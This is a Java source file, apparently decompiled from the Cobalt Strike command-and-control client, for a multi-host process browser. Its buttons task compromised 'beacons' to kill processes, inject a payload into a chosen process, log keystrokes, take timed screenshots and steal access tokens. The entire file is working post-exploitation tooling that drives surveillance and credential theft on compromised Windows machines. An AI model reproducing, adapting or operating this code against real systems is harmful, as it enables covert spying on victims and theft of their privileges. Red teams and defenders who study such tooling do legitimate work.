package aggressor.windows;

import aggressor.AggressorClient;
import aggressor.DataUtils;
import aggressor.dialogs.ScListenerChooser;
import beacon.TaskBeacon;
import common.AObject;
import common.BeaconEntry;
import common.Callback;
import common.CommonUtils;
import common.ScriptUtils;
import dialog.DialogUtils;
import dialog.SafeDialogCallback;
import dialog.SafeDialogs;
import java.awt.BorderLayout;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.awt.event.MouseEvent;
import java.util.HashMap;
import java.util.LinkedList;
import java.util.Stack;
import javax.swing.JButton;
import javax.swing.JComponent;
import javax.swing.JPanel;
import javax.swing.JSeparator;
import ui.ATable;
import ui.GenericTableModel;
import ui.TablePopup;

public class ProcessBrowserMulti extends AObject implements ActionListener, TablePopup {
   protected String[] bids = new String[0];
   protected AggressorClient client = null;
   protected LinkedList results = new LinkedList();
   protected ProcessBrowserMulti win = this;
   protected GenericTableModel model = null;
   protected ATable table = null;
   protected String[] cols = new String[]{"External", "Internal", "PID", "PPID", "Name", "Arch", "Session", "User"};

   public ProcessBrowserMulti(AggressorClient var1, String[] var2) {
      this.client = var1;
      this.bids = var2;
      this.model = DialogUtils.setupModel("PID", this.cols, new LinkedList());
   }

   public void refresh() {
      this.results = new LinkedList();
      DialogUtils.setTable(this.table, this.model, this.results);

      for(int var1 = 0; var1 < this.bids.length; ++var1) {
         final String var2 = this.bids[var1];
         this.client.getConnection().call("beacons.task_ps", CommonUtils.args(this.bids[var1]), new Callback() {
            public void result(String var1, Object var2x) {
               ProcessBrowserMulti.this.win.result(var2, "", var2x);
            }
         });
      }

   }

   public void actionPerformed(ActionEvent var1) {
      String var2 = var1.getActionCommand();
      final Object[][] var3;
      int var4;
      TaskBeacon var5;
      int var6;
      String var7;
      if ("Kill".equals(var2)) {
         var3 = this.model.getSelectedValuesFromColumns(this.table, CommonUtils.toArray("PID, Arch, bid"));

         for(var4 = 0; var4 < var3.length; ++var4) {
            var5 = new TaskBeacon(this.client, this.client.getData(), this.client.getConnection(), new String[]{(String)var3[var4][2]});
            var6 = Integer.parseInt(var3[var4][0] + "");
            var7 = var3[var4][1] + "";
            var5.input("kill " + var6);
            var5.Kill(var6);
            var5.Pause(500);
         }

         this.refresh();
      } else if ("Refresh".equals(var2)) {
         this.refresh();
      } else if ("Inject".equals(var2)) {
         ScListenerChooser.ListenersAll(this.client, new SafeDialogCallback() {
            public void dialogResult(String var1) {
               Object[][] var2 = ProcessBrowserMulti.this.model.getSelectedValuesFromColumns(ProcessBrowserMulti.this.table, CommonUtils.toArray("PID, Arch, bid"));

               for(int var3 = 0; var3 < var2.length; ++var3) {
                  TaskBeacon var4 = new TaskBeacon(ProcessBrowserMulti.this.client, ProcessBrowserMulti.this.client.getData(), ProcessBrowserMulti.this.client.getConnection(), new String[]{(String)var2[var3][2]});
                  int var5 = Integer.parseInt(var2[var3][0] + "");
                  String var6 = var2[var3][1] + "";
                  var4.input("inject " + var5 + " " + var6 + " " + var1);
                  var4.Inject(var5, var1, var6);
               }

            }
         }).show();
      } else if ("Log Keystrokes".equals(var2)) {
         var3 = this.model.getSelectedValuesFromColumns(this.table, CommonUtils.toArray("PID, Arch, bid"));

         for(var4 = 0; var4 < var3.length; ++var4) {
            var5 = new TaskBeacon(this.client, this.client.getData(), this.client.getConnection(), new String[]{(String)var3[var4][2]});
            var6 = Integer.parseInt(var3[var4][0] + "");
            var7 = var3[var4][1] + "";
            var5.input("keylogger " + var6 + " " + var7);
            var5.KeyLogger(var6, var7);
         }

         DialogUtils.showInfo("Tasked Beacons to log keystrokes");
      } else if ("Screenshot".equals(var2)) {
         var3 = this.model.getSelectedValuesFromColumns(this.table, CommonUtils.toArray("PID, Arch, bid"));
         SafeDialogs.ask("Take screenshots for X seconds:", "0", new SafeDialogCallback() {
            public void dialogResult(String var1) {
               int var2 = CommonUtils.toNumber(var1, 0);

               for(int var3x = 0; var3x < var3.length; ++var3x) {
                  TaskBeacon var4 = new TaskBeacon(ProcessBrowserMulti.this.client, ProcessBrowserMulti.this.client.getData(), ProcessBrowserMulti.this.client.getConnection(), new String[]{(String)var3[var3x][2]});
                  int var5 = Integer.parseInt(var3[var3x][0] + "");
                  String var6 = var3[var3x][1] + "";
                  var4.input("screenshot " + var5 + " " + var6 + " " + var2);
                  var4.Screenshot(var5, var6, var2);
               }

               DialogUtils.showInfo("Tasked Beacons to take screenshots");
            }
         });
      } else if ("Steal Token".equals(var2)) {
         var3 = this.model.getSelectedValuesFromColumns(this.table, CommonUtils.toArray("PID, Arch, bid"));

         for(var4 = 0; var4 < var3.length; ++var4) {
            var5 = new TaskBeacon(this.client, this.client.getData(), this.client.getConnection(), new String[]{(String)var3[var4][2]});
            var6 = Integer.parseInt(var3[var4][0] + "");
            var5.input("steal_token " + var6);
            var5.StealToken(var6);
         }

         DialogUtils.showInfo("Tasked Beacons to steal a token");
      }

   }

   public void showPopup(MouseEvent var1) {
      Stack var2 = new Stack();
      var2.push(ScriptUtils.convertAll(this));
      var2.push(ScriptUtils.convertAll(this.model.getSelectedRows(this.table)));
      this.client.getScriptEngine().getMenuBuilder().installMenu(var1, "processbrowser_multi", var2);
   }

   public JButton Button(String var1) {
      JButton var2 = new JButton(var1);
      var2.addActionListener(this);
      return var2;
   }

   public JComponent getContent() {
      JPanel var1 = new JPanel();
      var1.setLayout(new BorderLayout());
      this.table = DialogUtils.setupTable(this.model, this.cols, true);
      DialogUtils.setTableColumnWidths(this.table, DialogUtils.toMap("External: 180, Internal: 180, PID: 60, PPID: 60, Name: 180, Arch: 60, Session: 60, User: 180"));
      this.table.setPopupMenu(this);
      JButton var2 = this.Button("Kill");
      JButton var3 = this.Button("Refresh");
      JSeparator var4 = new JSeparator();
      JButton var5 = this.Button("Inject");
      JButton var6 = this.Button("Log Keystrokes");
      JButton var7 = this.Button("Screenshot");
      JButton var8 = this.Button("Steal Token");
      JSeparator var9 = new JSeparator();
      JButton var10 = this.Button("Help");
      var10.addActionListener(DialogUtils.gotoURL("https://www.cobaltstrike.com/help-process-browser"));
      var1.add(DialogUtils.FilterAndScroll(this.table), "Center");
      var1.add(DialogUtils.center(var2, var3, var4, var5, var6, var7, var8, var9, var10), "South");
      this.refresh();
      return var1;
   }

   public void result(String var1, String var2, Object var3) {
      BeaconEntry var4 = DataUtils.getBeacon(this.client.getData(), var1);
      if (var4 != null) {
         String[] var5 = var3.toString().trim().split("\n");

         for(int var6 = 0; var6 < var5.length; ++var6) {
            String[] var7 = var5[var6].split("\t");
            HashMap var8 = new HashMap();
            var8.put("bid", var1);
            var8.put("External", var4.getExternal());
            var8.put("Internal", var4.getInternal());
            if (var7.length >= 1) {
               var8.put("Name", var7[0]);
            }

            if (var7.length >= 2) {
               var8.put("PPID", var7[1]);
            }

            if (var7.length >= 3) {
               var8.put("PID", var7[2]);
            }

            if (var7.length >= 4) {
               var8.put("Arch", var7[3]);
            }

            if (var7.length >= 5) {
               var8.put("User", var7[4]);
            }

            if (var7.length >= 6) {
               var8.put("Session", var7[5]);
            }

            this.results.add(var8);
         }

         DialogUtils.setTable(this.table, this.model, this.results);
      }
   }
}
